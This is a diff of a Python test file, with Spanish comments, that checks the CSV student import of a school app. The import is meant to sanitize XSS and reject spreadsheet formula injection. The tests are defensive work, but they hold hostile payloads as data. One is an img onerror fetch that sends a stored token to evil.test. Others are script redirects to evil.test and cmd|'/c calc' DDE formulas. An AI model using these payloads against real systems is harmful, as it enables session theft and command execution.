@@ -2,8 +2,8 @@
 Sprint xss-host-header — segundo eslabón de la cadena descrita en
 AUDITORIA-BETA.md #1/#4: el import CSV de estudiantes construía el ORM
 directo desde las celdas crudas, sin pasar por EstudianteCreate — lo que
-permitía guardar HTML/script sin sanitizar en `diagnostico`/`ajustes`
-(datos PIAR de menores), que luego un chat con IA podía terminar
+permitía guardar HTML/script sin sanitizar en `ajustes` (y en el
+retirado `diagnostico`, Sprint F B4), que luego un chat con IA podía terminar
 repitiendo y ejecutando al renderizarse (ver test_chat_render_seguro.py
 para el primer eslabón, la sanitización del render).
 
@@ -35,12 +35,12 @@ def _upload(client, grupo_id: str, csv_text: str, filename: str = "test.csv"):
 # Sanitización HTML/XSS al guardar (bleach vía EstudianteCreate)
 # ═══════════════════════════════════════════════════════════════
 
-def test_script_en_diagnostico_se_sanitiza_al_guardar(client, seed_docente, db_session):
+def test_script_en_ajustes_se_sanitiza_al_guardar(client, seed_docente, db_session):
     from models import Estudiante
     gid = seed_docente["grupo"].id_grupo
     csv = (
-        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
-        'E001,M,1,"<script>alert(document.cookie)</script>TDA",\n'
+        "codigo_estudiante,genero,tiene_piar,ajustes\n"
+        'E001,M,0,"<script>alert(document.cookie)</script>Tiempo extra"\n'
     )
     r = _upload(client, gid, csv)
     assert r.status_code == 200, r.text
@@ -53,9 +53,9 @@ def test_script_en_diagnostico_se_sanitiza_al_guardar(client, seed_docente, db_s
     ).first()
     assert est is not None
     # El tag nunca sobrevive — lo que quede es texto plano, sin < >.
-    assert "<script" not in est.diagnostico.lower()
-    assert "<" not in est.diagnostico
-    assert "TDA" in est.diagnostico
+    assert "<script" not in est.ajustes.lower()
+    assert "<" not in est.ajustes
+    assert "Tiempo extra" in est.ajustes
 
 
 def test_html_en_nombre_estudiante_se_sanitiza_al_guardar(client, seed_docente, db_session):
@@ -65,8 +65,8 @@ def test_html_en_nombre_estudiante_se_sanitiza_al_guardar(client, seed_docente, 
     gid = seed_docente["grupo"].id_grupo
     payload = "<img src=x onerror=\"fetch('https://evil.test/?c='+localStorage.getItem('token'))\">Juan"
     csv = (
-        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
-        f'"{payload}",M,0,,\n'
+        "codigo_estudiante,genero,tiene_piar,ajustes\n"
+        f'"{payload}",M,0,\n'
     )
     r = _upload(client, gid, csv)
     assert r.status_code == 200, r.text
@@ -84,12 +84,12 @@ def test_html_en_ajustes_se_sanitiza_al_actualizar_estudiante_existente(client, 
     (setattr directo) — confirmar que también quedó cerrado."""
     from models import Estudiante
     gid = seed_docente["grupo"].id_grupo
-    csv1 = "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\nE100,M,0,,\n"
+    csv1 = "codigo_estudiante,genero,tiene_piar,ajustes\nE100,M,0,\n"
     assert _upload(client, gid, csv1).json()["creados"] == 1
 
     csv2 = (
-        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
-        'E100,M,0,,"<script>document.location=\'https://evil.test\'</script>Requiere apoyo"\n'
+        "codigo_estudiante,genero,tiene_piar,ajustes\n"
+        'E100,M,0,"<script>document.location=\'https://evil.test\'</script>Requiere apoyo"\n'
     )
     r2 = _upload(client, gid, csv2)
     assert r2.status_code == 200, r2.text
@@ -107,7 +107,7 @@ def test_longitud_maxima_se_valida_igual_que_creacion_individual(client, seed_do
     que EstudianteCreate.codigo_estudiante = Field(max_length=100))."""
     gid = seed_docente["grupo"].id_grupo
     codigo_largo = "X" * 150
-    csv = f"codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n{codigo_largo},M,0,,\n"
+    csv = f"codigo_estudiante,genero,tiene_piar,ajustes\n{codigo_largo},M,0,\n"
     body = _upload(client, gid, csv).json()
     assert body["creados"] == 0
     assert body["fallidos"] == 1
@@ -123,9 +123,9 @@ def test_celda_con_formula_igual_rechaza_la_fila(client, seed_docente, db_sessio
     from models import Estudiante
     gid = seed_docente["grupo"].id_grupo
     csv = (
-        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
-        '=SUM(A1:A10),M,0,,\n'
-        "E002,F,0,,\n"
+        "codigo_estudiante,genero,tiene_piar,ajustes\n"
+        '=SUM(A1:A10),M,0,\n'
+        "E002,F,0,\n"
     )
     r = _upload(client, gid, csv)
     assert r.status_code == 200, r.text
@@ -148,8 +148,8 @@ def test_celdas_con_prefijos_de_formula_variados_rechazan(client, seed_docente):
     gid = seed_docente["grupo"].id_grupo
     for i, prefijo in enumerate(("=", "+", "-", "@"), start=1):
         csv = (
-            "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
-            f"{prefijo}cmd|'/c calc'!A1,M,0,,\n"
+            "codigo_estudiante,genero,tiene_piar,ajustes\n"
+            f"{prefijo}cmd|'/c calc'!A1,M,0,\n"
         )
         body = _upload(client, gid, csv, filename=f"f{i}.csv").json()
         assert body["creados"] == 0, f"prefijo {prefijo!r} debería rechazar la fila"
@@ -157,18 +157,41 @@ def test_celdas_con_prefijos_de_formula_variados_rechazan(client, seed_docente):
         assert "fórmula" in body["errores"][0].lower()
 
 
-def test_formula_en_columna_diagnostico_tambien_rechaza(client, seed_docente):
+def test_formula_en_columna_ajustes_tambien_rechaza(client, seed_docente):
     """No sólo codigo_estudiante — cualquier columna de texto libre
     puede llevar el payload."""
     gid = seed_docente["grupo"].id_grupo
     csv = (
-        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
-        '=cmd|"/c calc"!A1,M,1,"=HYPERLINK(""http://evil.test"")",\n'
+        "codigo_estudiante,genero,tiene_piar,ajustes\n"
+        'E010,M,0,"=HYPERLINK(""http://evil.test"")"\n'
     )
     body = _upload(client, gid, csv).json()
     assert body["creados"] == 0
     assert body["fallidos"] == 1
-    assert "codigo_estudiante" in body["errores"][0]  # se revisa en orden, cae en la primera columna riesgosa
+    assert "ajustes" in body["errores"][0]
+
+
+def test_columna_diagnostico_de_plantilla_vieja_se_ignora_y_avisa(client, seed_docente, db_session):
+    """Sprint F, B4: un CSV viejo con columna `diagnostico` se importa
+    igual, pero el diagnóstico NUNCA llega a la base — y se avisa."""
+    from models import Estudiante
+    gid = seed_docente["grupo"].id_grupo
+    csv = (
+        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
+        "E020,F,0,MARCADOR_DIAGNOSTICO_UNICO,Tiempo extra\n"
+    )
+    r = _upload(client, gid, csv)
+    assert r.status_code == 200, r.text
+    body = r.json()
+    assert body["creados"] == 1
+    assert "diagnostico" in body["errores"][0] and "se ignoró" in body["errores"][0]
+
+    est = db_session.query(Estudiante).filter(
+        Estudiante.id_grupo == gid, Estudiante.codigo_estudiante == "E020",
+    ).first()
+    assert est.ajustes == "Tiempo extra"
+    assert not hasattr(est, "diagnostico")
+    assert "MARCADOR_DIAGNOSTICO_UNICO" not in r.text
 
 
 def test_formula_con_espacio_adelante_igual_se_detecta(client, seed_docente):
@@ -176,8 +199,8 @@ def test_formula_con_espacio_adelante_igual_se_detecta(client, seed_docente):
     igual una vez abre el archivo."""
     gid = seed_docente["grupo"].id_grupo
     csv = (
-        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
-        '"  =cmd|\'/c calc\'!A1",M,0,,\n'
+        "codigo_estudiante,genero,tiene_piar,ajustes\n"
+        '"  =cmd|\'/c calc\'!A1",M,0,\n'
     )
     body = _upload(client, gid, csv).json()
     assert body["creados"] == 0
@@ -196,8 +219,8 @@ def test_caracteres_de_control_rechazan_la_fila(client, seed_docente, db_session
     # para ese caso, que falla a nivel de archivo, no de fila.
     payload_con_control = "Juan\x01Perez"
     csv = (
-        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
-        f'"{payload_con_control}",M,0,,\n'
+        "codigo_estudiante,genero,tiene_piar,ajustes\n"
+        f'"{payload_con_control}",M,0,\n'
     )
     r = _upload(client, gid, csv)
     assert r.status_code == 200, r.text
@@ -227,11 +250,11 @@ def test_filas_validas_conviven_con_filas_rechazadas(client, seed_docente, db_se
     from models import Estudiante
     gid = seed_docente["grupo"].id_grupo
     csv = (
-        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
-        "Ana,F,0,,\n"
-        "=cmd|'/c calc'!A1,M,0,,\n"
-        "Beto\x01,M,0,,\n"
-        "Carla,F,1,TDA,Tiempo extra\n"
+        "codigo_estudiante,genero,tiene_piar,ajustes\n"
+        "Ana,F,0,\n"
+        "=cmd|'/c calc'!A1,M,0,\n"
+        "Beto\x01,M,0,\n"
+        "Carla,F,0,Tiempo extra\n"
     )
     body = _upload(client, gid, csv).json()
     assert body["creados"] == 2
